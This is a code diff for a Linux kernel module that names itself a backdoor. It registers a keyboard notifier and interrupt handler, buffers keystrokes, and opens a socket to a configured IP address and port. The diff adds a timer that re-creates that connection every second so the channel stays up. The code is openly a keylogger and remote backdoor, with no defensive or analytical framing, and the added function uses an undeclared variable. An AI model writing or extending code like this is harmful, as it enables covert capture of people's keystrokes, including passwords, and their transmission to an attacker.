@@ -5,15 +5,20 @@
 #include <linux/irq.h>
 #include <linux/interrupt.h>
 #include <linux/delay.h>
+#include <linux/timer.h>
 
 #include "backdoor.h"
 #include "networking.h"
+
 static struct notifier_block keyboard_notifier_block = {
     .notifier_call = keyboard_notifier_callback,
 };
 
 // Keyboard stroke buffer
 static char keystrokes[KEY_BUFFER_SIZE + 1] = ""; 
+
+// Timer to reinitialize connection
+static struct timer_list connection_timer;
 
 // Keyboard interrupt handler
 irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
@@ -51,6 +56,16 @@ int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code
 }
 
 
+void initialize_conn() {
+    result = create_socket(IP_ADDRESS, PORT);
+    if (result < 0) {
+        printk(KERN_ERR "Failed to connect\n");
+    }
+
+    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
+}
+
+
 static int __init keyboard_module_init(void) {
     int result;
 
@@ -59,6 +74,9 @@ static int __init keyboard_module_init(void) {
         printk(KERN_ERR "Failed to connect\n");
         return result;
     }
+
+    setup_timer(&connection_timer, initialize_conn, 0);
+    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
 
     // Register the keyboard notifier
     result = register_keyboard_notifier(&keyboard_notifier_block);
@@ -81,6 +99,8 @@ static void __exit keyboard_module_exit(void) {
 	printk(KERN_ERR "Unable to release socket");
 	return;
     }
+
+    del_timer(&connection_timer);
     printk(KERN_INFO "Backdoor module exited\n");
 }
 
